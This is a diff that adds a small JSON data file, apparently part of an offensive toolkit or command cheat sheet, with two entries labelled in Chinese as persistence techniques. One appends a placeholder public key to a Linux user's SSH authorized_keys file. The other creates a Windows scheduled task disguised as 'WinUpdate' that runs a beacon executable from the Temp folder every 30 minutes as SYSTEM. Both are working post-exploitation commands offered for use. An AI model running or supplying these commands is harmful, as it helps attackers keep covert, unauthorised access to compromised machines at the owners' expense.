@@ -1,0 +1,18 @@
+[
+  {
+    "id": "k-15",
+    "category": "权限维持",
+    "os": "Linux",
+    "title": "SSH 公钥维持",
+    "cmd": "mkdir -p ~/.ssh && echo \"{PUBKEY}\" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys",
+    "note": ""
+  },
+  {
+    "id": "k-16",
+    "category": "权限维持",
+    "os": "Windows",
+    "title": "计划任务维持",
+    "cmd": "schtasks /create /tn \"WinUpdate\" /tr \"C:\\Windows\\Temp\\beacon.exe\" /sc minute /mo 30 /ru SYSTEM",
+    "note": ""
+  }
+]
